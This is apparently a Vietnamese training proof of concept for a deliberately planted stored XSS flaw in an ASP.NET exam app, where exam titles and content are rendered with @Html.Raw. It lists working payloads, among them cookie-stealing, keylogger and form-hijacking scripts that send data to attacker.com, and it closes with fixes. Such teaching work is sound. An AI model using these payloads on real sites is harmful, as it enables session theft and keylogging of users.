# Proof of Concept (PoC) - Lỗ hổng Stored XSS (Cross-Site Scripting)

## Mô tả lỗ hổng

**Loại lỗ hổng**: Stored Cross-Site Scripting (Stored XSS)  
**Trang bị lỗi**: `http://localhost:5000/Student` và `http://localhost:5000/Student/Exam/{id}`  
**Endpoint nhập liệu**: `POST /Teacher/Exams/Create`  
**Mức độ**: High  
**Mô tả**: Teacher có thể nhập JavaScript code vào Title hoặc Content khi tạo đề thi, code này được lưu vào database và tự động thực thi khi Student xem danh sách đề thi hoặc chi tiết đề thi.

## Nguyên nhân

Trong các Views của Student (`Views/Student/Index.cshtml` và `Views/Student/ExamDetail.cshtml`), Title và Content được hiển thị bằng `@Html.Raw()` thay vì output encoding tự động. Điều này cho phép HTML/JavaScript được render trực tiếp thay vì được encode thành text an toàn.

**Code có lỗ hổng:**

```csharp
// Views/Student/Index.cshtml
<td>@Html.Raw(e.Title)</td>  // VULNERABILITY: Raw HTML output

// Views/Student/ExamDetail.cshtml
<h2>Exam: @Html.Raw(Model.Title)</h2>  // VULNERABILITY: Raw HTML output
<p>@Html.Raw(Model.Content)</p>  // VULNERABILITY: Raw HTML output
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có tài khoản Teacher để tạo đề thi
3. Có tài khoản Student để xem đề thi

### Bước 2: Đăng nhập với tài khoản Teacher

1. Truy cập: `http://localhost:5000/Auth/Login`
2. Đăng nhập với tài khoản Teacher
3. Vào trang: `http://localhost:5000/Teacher/Exams/Create`

### Bước 3: Tạo đề thi với XSS payload

**Payload 1: Alert đơn giản trong Title**

1. Vào trang Create Exam
2. Nhập Title:
   ```html
   <img src=x onerror=alert('XSS by Teacher - Title')>
   ```
3. Nhập Content: `Test exam content`
4. Click "Create"

**Payload 2: Cookie stealing trong Title**

1. Tạo đề thi mới
2. Title:
   ```html
   <img src=x onerror="document.location='http://attacker.com/steal?cookie='+document.cookie">
   ```
3. Content: `Test exam`
4. Click "Create"

**Payload 3: XSS trong Content (phức tạp hơn)**

1. Tạo đề thi mới
2. Title: `Test Exam`
3. Content:
   ```html
   <script>alert('XSS in Content - Stored XSS');</script>
   <p>Normal exam content here</p>
   ```
4. Click "Create"

**Payload 4: Keylogger/Form hijacking**

1. Title: `Normal Title`
2. Content:
   ```html
   <script>
   document.addEventListener('keypress', function(e) {
       fetch('http://attacker.com/keylog?key=' + e.key);
   });
   </script>
   <p>Exam question: What is 2+2?</p>
   ```
3. Click "Create"

### Bước 4: Xác minh lỗ hổng

1. **Đăng xuất khỏi Teacher account**
2. **Đăng nhập với Student account**
3. **Truy cập**: `http://localhost:5000/Student`
4. **Quan sát**: 
   - Nếu XSS payload trong Title → JavaScript sẽ chạy ngay khi load trang danh sách
   - Alert sẽ xuất hiện hoặc script sẽ thực thi

5. **Click vào đề thi** để xem chi tiết
6. **Quan sát**:
   - Nếu XSS payload trong Content → JavaScript sẽ chạy khi xem chi tiết
   - Alert sẽ xuất hiện hoặc script sẽ thực thi

### Bước 5: Kiểm tra trong Browser Console

1. Mở Developer Tools (F12)
2. Vào tab Console
3. Xem các lỗi hoặc log từ XSS payload
4. Vào tab Network để xem các request được gửi đi (nếu payload có fetch/XHR)

## Kết quả mong đợi

- ✅ XSS payload được lưu vào database thành công
- ✅ Khi Student xem danh sách đề thi, JavaScript trong Title được thực thi
- ✅ Khi Student xem chi tiết đề thi, JavaScript trong Title/Content được thực thi
- ✅ Alert hiển thị hoặc script thực thi thành công
- ✅ Cookie có thể bị đánh cắp (nếu payload có chức năng này)

## Tác động

1. **Cookie Theft**: Attacker có thể đánh cắp session cookie của Student
2. **Session Hijacking**: Attacker có thể chiếm quyền session của Student
3. **Phishing**: Attacker có thể hiển thị form giả để lừa lấy thông tin
4. **Keylogging**: Attacker có thể ghi lại các phím bấm của Student
5. **Defacement**: Attacker có thể thay đổi giao diện trang web
6. **Malware Distribution**: Attacker có thể redirect Student đến trang chứa malware

## Các payload XSS mẫu

### Payload đơn giản (Alert):
```html
<script>alert('XSS')</script>
```

### Payload với img tag (Bypass filter đơn giản):
```html
<img src=x onerror=alert('XSS')>
```

### Payload Cookie Stealing:
```html
<script>
var img = new Image();
img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

### Payload Keylogger:
```html
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?key=' + e.key;
}
</script>
```

### Payload Form Hijacking:
```html
<script>
document.forms[0].action = 'http://attacker.com/steal';
</script>
```

### Payload với SVG (Bypass một số filter):
```html
<svg onload=alert('XSS')>
```

### Payload với iframe:
```html
<iframe src="javascript:alert('XSS')"></iframe>
```

### Payload Base64 (để bypass filter):
```html
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
```

## Cách khắc phục

1. **Luôn sử dụng output encoding**: Thay `@Html.Raw()` bằng output encoding tự động của Razor
2. **Validate và sanitize input**: Loại bỏ hoặc encode các ký tự HTML đặc biệt
3. **Content Security Policy (CSP)**: Thêm CSP headers để giảm thiểu tác động
4. **Whitelist-based validation**: Chỉ cho phép format cụ thể (markdown, plain text)

**Code sửa lỗi:**

```csharp
// Views/Student/Index.cshtml
<td>@e.Title</td>  // Razor tự động encode HTML

// Views/Student/ExamDetail.cshtml
<h2>Exam: @Model.Title</h2>  // Razor tự động encode HTML
<p>@Html.Encode(Model.Content)</p>  // Hoặc dùng Html.Encode()
```

**Nếu cần hiển thị HTML (như Markdown):**

1. Sử dụng thư viện Markdown parser an toàn
2. Sanitize HTML output (như HtmlSanitizer)
3. Chỉ cho phép các tags an toàn (whitelist)

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Views/Student/Index.cshtml`

```csharp
<td>@Html.Raw(e.Title)</td>  // VULNERABILITY: Raw HTML output, không encode
```

**File:** `Views/Student/ExamDetail.cshtml`

```csharp
<h2>Exam: @Html.Raw(Model.Title)</h2>  // VULNERABILITY
<p>@Html.Raw(Model.Content)</p>  // VULNERABILITY
```

**So sánh với code an toàn:**

```csharp
<td>@e.Title</td>  // Razor tự động encode: <script> → &lt;script&gt;
<h2>Exam: @Model.Title</h2>  // An toàn
<p>@Html.Encode(Model.Content)</p>  // An toàn
```

### Flow của lỗ hổng:

1. **Teacher** tạo đề thi với Title/Content chứa JavaScript
2. JavaScript được **lưu vào database** (stored)
3. **Student** xem danh sách đề thi → Title được render bằng `@Html.Raw()` → JavaScript thực thi
4. **Student** xem chi tiết đề thi → Title/Content được render bằng `@Html.Raw()` → JavaScript thực thi

### Cách khai thác:

1. **Teacher** (hoặc attacker đã chiếm quyền Teacher) đăng nhập
2. Tạo đề thi với XSS payload trong Title hoặc Content
3. Đề thi được lưu vào database
4. **Tất cả Student** xem đề thi đều bị ảnh hưởng (stored XSS)
5. JavaScript thực thi trong context của Student → Cookie/Session bị đánh cắp

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **KHÔNG BAO GIỜ** sử dụng `@Html.Raw()` với user input
- Luôn áp dụng nguyên tắc **"Output Encoding"** - luôn encode output
- Sử dụng **Content Security Policy (CSP)** để giảm thiểu tác động nếu có XSS
- **Input Validation** và **Output Encoding** là 2 lớp bảo vệ quan trọng
- Stored XSS nguy hiểm hơn Reflected XSS vì ảnh hưởng đến tất cả người dùng

## Checklist test

- [ ] Đăng nhập với Teacher account
- [ ] Tạo đề thi với XSS payload trong Title
- [ ] Tạo đề thi với XSS payload trong Content
- [ ] Đăng xuất và đăng nhập với Student account
- [ ] Truy cập `/Student` và xem alert/payload thực thi
- [ ] Click vào đề thi và xem payload trong Content thực thi
- [ ] Kiểm tra Browser Console để xem có lỗi gì không
- [ ] Test với các payload khác nhau
- [ ] Verify payload được lưu trong database

